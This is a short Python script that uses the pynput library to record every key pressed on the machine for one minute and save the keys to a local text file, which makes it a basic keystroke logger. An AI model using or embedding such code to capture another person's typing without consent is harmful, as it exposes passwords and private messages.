from pynput import keyboard
from datetime import datetime, timedelta

duration = timedelta(minutes=1)

filename = "rec.txt"

keys = []

def on_press(key):
    keys.append(key)

def on_release(key):
    if datetime.now() - start_time >= duration:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    start_time = datetime.now()
    listener.join()


with open(filename, "w") as file:
    for key in keys:
        file.write(str(key))
